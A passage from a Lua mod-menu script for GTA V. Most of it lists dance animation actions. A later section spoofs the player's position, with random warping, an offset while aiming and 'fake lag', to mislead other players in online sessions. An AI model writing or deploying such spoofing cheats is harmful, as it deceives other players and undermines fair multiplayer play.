    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_13_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartymed, "Island Party Medium Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^6", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 55", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^1", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 56", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^2", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 57", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^3", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 58", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^4", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 59", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^5", -1)
end)
menu.action(dances_vroot_islandpartylow, "Island Party Low Intensity 60", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub_island@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^6", -1)
end)

----- EROTIC DANCES -----

menu.action(dances_erotic_vroot, "Lap Dance 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@peds@", "mini_strip_club_lap_dance_ld_girl_a_song_a_p1", -1)
end)

menu.action(dances_erotic_vroot, "Lap Dance 2", {""}, "", function(on_click)
    play_animstationary("switch@trevor@mocks_lapdance", "001443_01_trvs_28_exit_stripper", -1)
end)

menu.action(dances_erotic_vroot, "Lap Dance 3", {""}, "", function(on_click)
    play_animstationary("mp_am_stripper", "lap_dance_girl", -1)
end)

menu.action(dances_erotic_vroot, "Private Dance 1", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@private_dance@part1", "priv_dance_p1", -1)
end)

menu.action(dances_erotic_vroot, "Private Dance 2", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@private_dance@part2", "priv_dance_p2", -1)
end)

menu.action(dances_erotic_vroot, "Private Dance 3", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@private_dance@part3", "priv_dance_p3", -1)
end)

menu.action(dances_erotic_vroot, "Private Dance 4", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@private_dance@exit", "priv_dance_exit", -1)
end)

menu.action(dances_erotic_vroot, "Pole Dance 1", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@pole_dance@pole_dance1", "pd_dance_01", -1)
end)

menu.action(dances_erotic_vroot, "Pole Dance 2", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@pole_dance@pole_dance2", "pd_dance_02", -1)
end)

menu.action(dances_erotic_vroot, "Pole Dance 3", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@pole_dance@pole_dance3", "pd_dance_03", -1)
end)

menu.action(uwuself, "Stop all sounds", {"stopsounds"}, "", function()
    for i=-1,190 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------
--Pos Spoofing Extension
pos = players.get_position(players.user())

menu.divider(path, "Random Warping")

menu.slider_float(path, "Random Radius", {"radius"}, "sets the radius the random position can be in", 0, 10000, 1000, 100, function (value)
    radius = value / 100;
end)

menu.slider(path, "Randomm Interval (ms)", {"interval (ms)"}, "sets interval between warps", 0, 15000, 2000, 50, function (value)
    interval = value
end)

--Taken From WiriScript
function get_ground_z(pos)
    local pGroundZ = memory.alloc(4)
    MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, pGroundZ, false, true)
    local groundz = memory.read_float(pGroundZ)
    return groundz
end

function random_pos()
    changed_pos.x = pos.x + math.random(-radius, radius)
    changed_pos.y = pos.y + math.random(-radius, radius)
    changed_pos.z += 50;
    changed_pos.z = get_ground_z(changed_pos)
end

menu.toggle_loop(path, "Randomize Position", {"randwarp"}, "spoofs your position to a random place within a radius around your current position at the given interval", function ()

    if pos then
        if not aim_rand then
        random_pos();
        menu.trigger_commands("spoofedposition " .. tostring(changed_pos.x) .. ", " .. tostring(changed_pos.y) .. ", " .. tostring(changed_pos.z))
        util.yield(interval)
        elseif aim_rand and PED.GET_PED_CONFIG_FLAG(players.user_ped(), 78, false) then
        random_pos();
        menu.trigger_commands("spoofedposition " .. tostring(changed_pos.x) .. ", " .. tostring(changed_pos.y) .. ", " .. tostring(changed_pos.z))
        util.yield(interval)
        end
    else
        util.toast("Failed Lmao")
    end
end)

menu.toggle(path, "Random Position When Aiming", {},"spoofs your position to a random place within a radius around your current position at the given interval but only when aiming", function()
    aim_rand = not aim_rand
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------

menu.divider(path, "Slight Offset")

menu.toggle_loop(path, "Offset Position", {"offsetpos"}, "spoofs your position a slight offset from your actual ped when ADS'ing", function ()

    if PED.GET_PED_CONFIG_FLAG(players.user_ped(), 78, false) then
        changed_pos.x = pos.x + x_off
        changed_pos.y = pos.y + y_off
        changed_pos.z += 50;
        changed_pos.z = get_ground_z(changed_pos)
    elseif not aim_only then
        changed_pos.x = pos.x + x_off
        changed_pos.y = pos.y + y_off
        changed_pos.z += 50;
        changed_pos.z = get_ground_z(changed_pos)
    else
        changed_pos = pos
    end
    menu.trigger_commands("spoofedposition " .. tostring(changed_pos.x) .. ", " .. tostring(changed_pos.y) .. ", " .. tostring(changed_pos.z))

end, function() menu.trigger_commands("spoofpos off") end)

menu.toggle(path, "Only When Aiming", {},"only offset pos when aiming", function()
    aim_only = not aim_only
end)

menu.slider_float(path, "X Offse", {}, "sets the x offset for offset position", -100, 100, 0, 5, function (value)
    x_off = value / 100;
end)

menu.slider_float(path, "Y Offse", {}, "sets the y offset for offset position", -100, 100, 0, 5, function (value)
    y_off = value / 100;
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------

menu.divider(path, "Fake Lag")

menu.toggle_loop(path, "Fake Lag", {"fakelag"}, "makes your position update only after every certain number of ms", function ()

    if pos then
        if not aim_only_fake_lag then
            changed_pos = pos
            menu.trigger_commands("spoofedposition " .. tostring(changed_pos.x) .. ", " .. tostring(changed_pos.y) .. ", " .. tostring(changed_pos.z))
            util.yield(fakelag_ms)
        elseif  aim_only_fake_lag and PED.GET_PED_CONFIG_FLAG(players.user_ped(), 78, false) then
            changed_pos = pos
            menu.trigger_commands("spoofedposition " .. tostring(changed_pos.x) .. ", " .. tostring(changed_pos.y) .. ", " .. tostring(changed_pos.z))
            util.yield(fakelag_ms)
        else
            changed_pos = pos
            menu.trigger_commands("spoofedposition " .. tostring(changed_pos.x) .. ", " .. tostring(changed_pos.y) .. ", " .. tostring(changed_pos.z))
        end
    end

end, function() menu.trigger_commands("spoofpos off") end)

menu.toggle(path, "Only When Aiming", {},"only fakelag when aiming", function()
    aim_only_fake_lag  = not aim_only_fake_lag
end)

menu.slider(path, "Fakelag MS (ms)", {}, "sets interval between position updates", 0, 1000, 0, 5, function (value)
    fakelag_ms = value
end)

--------------------------------------------------------------------------------------------------------------------------------------------------------

local resources_dir = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'
local needletexture = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\needle.png'
local speedometercasetex = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\speedometer_case.png'
local checkenginelighttex = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\check_engine.png'
local tachcasetex = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\tach_case.png'
local highbeamtexture = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\highbeam.png'
local lowbeamtexture = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\lowbeam.png'
local tpmstexture = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\tpms.png'
local tractiontexture = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\traction.png'

Speedometer = menu.list(uwuvehicle, "Speedometer", {}, "")

white = {
    r = 1,
    g = 1,
    b = 1,
    a = 1.0
}

orange = {
    r = 1.0,
    g = 0.5,
    b = 0,
    a = 1
}

blue = {
    r = 0, 
    g = 0, 
    b = 1, 
    a = 1
}

green = {
    r = 0, 
    g = 1, 
    b = 0, 
    a = 1
}

if not filesystem.exists(resources_dir) then
    util.toast("You Are Missing The FewMod Folder & or Required Textures, Please Install It From Github Using The Hyperlink Found In Stand>Misc \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    util.log("You Are Missing The FewMod Folder & or Required Textures, Please Install It From Github Using The Hyperlink Found In Stand>Misc \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    goto skipspeedometer
elseif filesystem.exists(resources_dir) then

    if not filesystem.exists(needletexture) then
        util.toast("You Are Missing The Texture 'needle.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'needle.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(needletexture) then
    needle = directx.create_texture(resources_dir .. 'needle.png')
    end

    if not filesystem.exists(speedometercasetex) then
        util.toast("You Are Missing The Texture 'speedometer_case.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'speedometer_case.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(speedometercasetex) then
    speedometer_case = directx.create_texture(resources_dir .. 'speedometer_case.png')
    end

    if not filesystem.exists(checkenginelighttex) then
        util.toast("You Are Missing The Texture 'check_engine.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'check_engine.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(checkenginelighttex) then
    check_engine_light = directx.create_texture(resources_dir .. 'check_engine.png')
    end

    if not filesystem.exists(checkenginelighttex) then
        util.toast("You Are Missing The Texture 'check_engine.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'check_engine.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(checkenginelighttex) then
    check_engine_light = directx.create_texture(resources_dir .. 'check_engine.png')
    end

    if not filesystem.exists(tachcasetex) then
        util.toast("You Are Missing The Texture 'tach_case.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'tach_case.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(tachcasetex) then
    tach_case = directx.create_texture(resources_dir .. 'tach_case.png')
    end

    if not filesystem.exists(highbeamtexture) then
        util.toast("You Are Missing The Texture 'highbeam.png' in FewMod/textures Please Ensure To Install It. \n https://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing The Texture 'highbeam.png' in FewMod/textures Please Ensure To Install It. \n https://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(highbeamtexture) then
    high_beam = directx.create_texture(resources_dir .. 'highbeam.png')
    end

    if not filesystem.exists(lowbeamtexture) then
        util.toast("You Are Missing The Texture 'lowbeam.png' in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
